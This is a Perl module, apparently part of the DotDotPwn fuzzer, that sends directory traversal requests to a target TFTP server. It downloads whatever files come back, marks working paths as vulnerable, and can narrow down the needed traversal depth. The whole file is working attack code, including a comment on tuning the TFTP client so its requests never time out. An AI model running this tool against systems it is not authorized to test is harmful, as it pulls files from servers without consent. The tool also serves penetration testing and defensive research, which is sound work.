#!/usr/bin/perl
# 
# Package to craft and send the TFTP requests
# by chr1x & nitr0us
#

package DotDotPwn::TFTP;
use Exporter 'import';
@EXPORT = qw(FuzzTFTP);

use DotDotPwn::BisectionAlgorithm;

my $tftpm=eval { require TFTP; };
use Time::HiRes qw(usleep);

sub FuzzTFTP{
	my ($host, $port, $bisection_request) = @_;
	our $n_travs = 0;

        # Fail if the TFTP module is missing...
        if (!$tftpm) {
            print "[!] Unable to load TFTP module, is it installed?\n";
            exit;
        }
	if(!$bisection_request){
		open(REPORT , ">>$main::report");

		chdir "retrieved_files";
		$pwd = `pwd`;
		for my $fh (STDOUT, REPORT) { print $fh "[+] Local Path to download files: $pwd \n"; }

		print "[+] Press Enter to continue\n";
		<STDIN>;
		print "[+] Testing ...\n";
	}

	foreach $traversal (@main::traversals){
		$tftp = TFTP->new($host, Port => $port,
					Mode => "netascii",
					# (nitr0us)
					# A little arithmetic trick to bypass some functionality bugs in the TFTP module ;)
					#
					# The next parameters twisted my mind for a couple of minutes, but after reading a bit
					# the source code of the TFTP module, I figured out how to bypass the following lines:
					# $retry = 0;
					# last if $retry >= $tftp->{'retries'};
					# $retry++;
					# ...
					# sub timeout {
					# 	my $timeout = $self->{'timeout'};
					# 	$timeout *= ($retry+1);
					# 	return ($timeout > $MaxTimeout ? $MaxTimeout : $timeout);
					# }
					#
					# So, doing some calculations I found the way to pass -1 as the timeout parameter (4th) in 
					# the select() syscall used in:
					# $count = select($rout=$rin, undef, $eout=$rin, $tftp->timeout($retry));
					#
					# All this to send ONE simple TFTP request WITHOUT timeouts. So:
					# $timeout = (0 * (0 + 1)); # So, 0 * 1 = 0
					# return (0 > 1337 ? 1 : -1) # So, it returns a -1 that is used in the select() syscall ;) [NO TIMEOUTS]
					# 
					Retries => 0,
					Timeout => 0,
					Maxtimeout => 1337);

		# Return 1 (vulnerable) or 0 (not vulnerable) to BisectionAlgorithm()
		if($bisection_request){
			if($tftp->get($bisection_request)){
				$tftp->quit;
				return 1; # Vulnerable
			} else {
				$tftp->quit;
				return 0; # Not Vulnerable
			}
		}

		# (chr1x) Finally, fixed.
		# I needed to put this type of validation since the TFTP module was not accepting status response codes.
		if($tftp->get($traversal)){
			for my $fh (STDOUT, REPORT) { print $fh "[*] Testing Path: $traversal <- VULNERABLE!\n"; }
			$n_travs++;

			if($main::bisect){
				print "\n[========= BISECTION ALGORITHM  =========]\n\n";
				$tftp->quit;

				DotDotPwn::BisectionAlgorithm::BisectionAlgorithm(1, $main::bisdeep, $traversal);

				return 1;
			}

			return $n_travs if $main::break;

			$tftp->quit;

			usleep($main::time);
			next;
		}

		print "[*] Testing Path: $traversal\n" unless $main::quiet;

		usleep($main::time);

		$tftp->quit;
	}

	return $n_travs;
}
1;
